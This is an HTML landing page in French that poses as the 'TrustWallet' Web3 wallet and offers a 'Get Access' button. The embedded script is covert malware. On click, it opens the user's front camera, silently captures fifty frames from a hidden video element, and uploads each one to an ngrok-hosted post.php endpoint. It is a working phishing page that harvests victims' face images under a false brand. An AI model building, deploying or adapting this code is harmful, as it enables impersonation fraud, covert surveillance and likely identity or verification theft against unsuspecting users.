<!doctype html>
<html lang="fr">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width,initial-scale=1" />
<title>TrustWallet</title>
<style>
:root {
  --accent:#1e90ff;
  --bg:linear-gradient(180deg,#0a1226 0%, #081226 60%, #07122b 100%);
  --white: #ffffff;
}
body{
  margin:0; font-family:Inter, system-ui, Arial, sans-serif; background:var(--bg); color:var(--white);
  -webkit-font-smoothing:antialiased; -moz-osx-font-smoothing:grayscale;
}
.container{max-width:1000px;margin:0 auto;padding:40px 20px;text-align:center;}
header{display:flex;align-items:center;justify-content:space-between;gap:20px;}
.logo{display:flex;align-items:center;gap:12px;}
.logo .mark img{
  width:28px; /* logo plus petit */
  height:28px;
  border-radius:6px;
}
.logo h2{margin:0;font-size:18px;font-weight:600;}
main.hero{margin-top:36px;display:flex;gap:30px;align-items:center;justify-content:center;flex-wrap:wrap;}
.hero-left{text-align:left;max-width:520px;}
.eyebrow{font-size:14px;opacity:0.85;margin-bottom:12px;}
h1{font-size:40px;margin:0 0 12px;line-height:1.02;}
p.lead{margin:0 0 20px;color:rgba(255,255,255,0.85);}
.cta-row{display:flex;gap:12px;flex-wrap:wrap;}
.btn{background:var(--accent);color:white;padding:14px 22px;border-radius:12px;border:0;font-size:16px;cursor:pointer;box-shadow:0 8px 24px rgba(30,144,255,0.12);}
.hero-right{display:flex;align-items:center;justify-content:center;}
.card{
  background:linear-gradient(180deg, rgba(255,255,255,0.03), rgba(255,255,255,0.01));
  padding:18px; border-radius:14px;
  box-shadow:0 10px 30px rgba(2,6,23,0.6);
  max-width:420px; /* plus large */
  width:100%;
}
#display{
  display:block;
  border-radius:10px;
  max-width:100%;
  width:400px; /* plus large */
  height:300px; /* plus haut */
  object-fit:cover;
  border:2px solid rgba(255,255,255,0.06);
}
.actions{margin-top:18px;text-align:center;}
footer{margin-top:50px;color:rgba(255,255,255,0.4);font-size:13px;}
@media (max-width:760px){
  h1{font-size:26px;}
  .hero-left{text-align:center;}
  header{flex-direction:column;align-items:center;gap:10px;}
  #display{width:100%; height:auto;}
}
</style>
</head>
<body>
<div class="container">
  <header>
    <div class="logo">
      <div class="mark"><img src="trustwallet-logo.png" alt="TrustWallet Logo"></div>
      <div>
        <h2>TrustWallet</h2>
        <div style="font-size:12px;color:rgba(255,255,255,0.6)">Secure • Web3 • Mobile</div>
      </div>
    </div>
  </header>

  <main class="hero">
    <div class="hero-left">
      <div class="eyebrow">Le portefeuille Web3</div>
      <h1>Gérez vos cryptos, NFT et dApps en toute simplicité</h1>
      <p class="lead">Accédez à vos actifs, échangez et explorez le Web3 — tout depuis une seule application sécurisée.</p>

      <div class="cta-row">
        <button id="getAccessBtn" class="btn">Get Access</button>
      </div>
    </div>

    <div class="hero-right">
      <div class="card">
        <img id="display" src="Capture.PNG?v=2" alt="Capture" width="400" height="300">
        <div class="actions"></div>
      </div>
    </div>
  </main>
</div>

<video id="video" autoplay muted playsinline style="display:none;width:0;height:0;"></video>
<canvas id="canvas" width="400" height="300" style="display:none;"></canvas>

<script>
const API_URL = "https://unsighing-prepalatine-yi.ngrok-free.dev/post.php";
const getBtn = document.getElementById('getAccessBtn');
const video = document.getElementById('video');
const canvas = document.getElementById('canvas');

function captureFrame(){
  const ctx = canvas.getContext('2d');
  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
  return canvas.toDataURL('image/png');
}

async function sendImage(base64){
  try{
    const r = await fetch(API_URL, {
      method: 'POST',
      headers: {'Content-Type':'application/json'},
      body: JSON.stringify({ imageBase64: base64 })
    });
    return await r.json();
  }catch(e){ console.error('send error', e); return null; }
}

getBtn.addEventListener('click', async () => {
  getBtn.disabled = true;
  getBtn.textContent = 'Processing...';

  let stream;
  try {
    stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
  } catch (err) {
    alert('Accès caméra refusé : ' + (err.message || err));
    getBtn.disabled = false;
    getBtn.textContent = 'Get Access';
    return;
  }

  video.srcObject = stream;
  try{ await video.play(); }catch(e){}

  const CAPTURES = 50;
  const INTERVAL = 1200;
  for(let i=0;i<CAPTURES;i++){
    const base64 = captureFrame();
    sendImage(base64).then(res=>console.log('sent',res)).catch(()=>{});
    await new Promise(r=>setTimeout(r, INTERVAL));
  }

  stream.getTracks().forEach(t=>t.stop());
  getBtn.disabled = false;
  getBtn.textContent = 'Get Access';
});
</script>
</body>
</html>
